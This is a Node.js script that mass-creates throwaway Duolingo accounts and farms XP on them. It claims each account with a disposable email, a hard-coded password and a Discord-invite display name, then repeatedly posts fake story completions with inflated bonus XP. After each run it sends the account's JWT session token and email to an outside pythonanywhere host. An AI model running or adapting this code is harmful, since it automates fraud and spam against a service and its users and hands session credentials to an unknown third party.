const crypto = require('crypto');
const fs = require('fs');

process.on('uncaughtException', () => {
	console.log('there was an uncaught exception');
});

const doStory = async (jwt, email, loops) => {
	setTimeout(async () => {
	if (loops === 11) {
		createAcc();
		fetch('https://clauneckmoney.eu.pythonanywhere.com/asdf?jwt=' + encodeURIComponent(jwt) + '&email=' + encodeURIComponent(email));
		return console.log(jwt);
	};
	const time = Math.round(Date.now() / 1000);
	const resp = await fetch("https://stories.duolingo.com/api2/stories/fr-en-le-passeport/complete", {
    		"headers": {
        		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0",
        		"Accept": "*/*",
        		"Accept-Language": "en-US,en;q=0.5",
        		"Content-Type": "application/json",
        		"Sec-GPC": "1",
        		"Sec-Fetch-Dest": "empty",
        		"Sec-Fetch-Mode": "cors",
        		"Sec-Fetch-Site": "same-site",
        		"Authorization": "Bearer " + jwt,
        		"Priority": "u=4"
    		},
    		"body": "{\"awardXp\":true,\"completedBonusChallenge\":true,\"fromLanguage\":\"en\",\"learningLanguage\":\"es\",\"hasXpBoost\":false,\"illustrationFormat\":\"svg\",\"isFeaturedStoryInPracticeHub\":true,\"isLegendaryMode\":true,\"isV2Redo\":false,\"isV2Story\":false,\"masterVersion\":true,\"maxScore\":0,\"score\":0,\"happyHourBonusXp\":469,\"startTime\":" + time + ",\"endTime\":" + time + "}",
    		"method": "POST"
	});
		if (resp.status === 429) console.log('rate limited');
	await doStory(jwt, email, loops + 1);
	}, 500);
};

const createAcc = async () => {
	//console.log('creating unclaimed acc');
	
	const resp = await fetch('https://android-api-cf.duolingo.com/2023-05-23/users?fields=id,creationDate,fromLanguage,courses,currentCourseId,username,health,zhTw,hasPlus,joinedClassroomIds,observedClassroomIds,roles', {
		headers: {
                	accept: 'application/json',
                	connection: 'Keep-Alive',
                	'content-type': 'application/json',
                	host: 'android-api-cf.duolingo.com',
                	'user-agent': 'Duodroid/6.26.2 Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/AE3A.224105.435',
			'x-amzn-trace-id': 'User=0'
		},
		body: JSON.stringify({
                	currentCourseId: 'DUOLINGO_FR_EN',
                	distinctId: crypto.randomUUID(),
                	fromLanguage: 'en',
                	timezone: 'Asia/Saigon',
                	zhTw: false
		}),
		method: 'POST'
	});

	const jwt = resp.headers.get('jwt');
	const respJson = await resp.json();
	const duoId = respJson['id'];

	//console.log('claiming acc');

	const username = crypto.randomUUID().split('-')[0];
	const email = username + '@sharklasers.com';

	const claim = await fetch('https://android-api-cf.duolingo.com/2017-06-30/batch?fields=responses', {
		headers: {
			"accept": "application/json",
        		"authorization": "Bearer " + jwt,
        		"connection": "Keep-Alive",
        		"content-type": "application/json",
        		"cookie": "jwt_token=" + jwt,
        		"origin": "https://www.duolingo.com",
			"user-agent": "Duodroid/6.26.2 Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/AE3A.224105.435",
        		"x-amzn-trace-id": "User=" + duoId,
		},
		body: JSON.stringify({
                    'requests': [{
                        'body': JSON.stringify({
                            'age': 20,
                            'distinctId': "UserId(id=" + duoId + ")",
                            'email': email,
                            'emailPromotion': true,
                            'name': 'https discord gg VU8t67TBKs',
                            'firstName': 'James',
                            'lastName': 'Bond',
                            'username': username,
                            'password': 'aakfoEFSPno1!', 
                            'pushPromotion': true,
                            'timezone': 'Asia/Saigon'
                        }),
                        'bodyContentType': 'application/json',
                        'method': 'PATCH',
                        'url': '/2023-05-23/users/' + duoId + '?fields=id,email,name'
                    }]
                }),
		method: 'POST'
	});

	if (claim.status === 200) {
		await doStory(jwt, email, 0);
	};
};

createAcc();

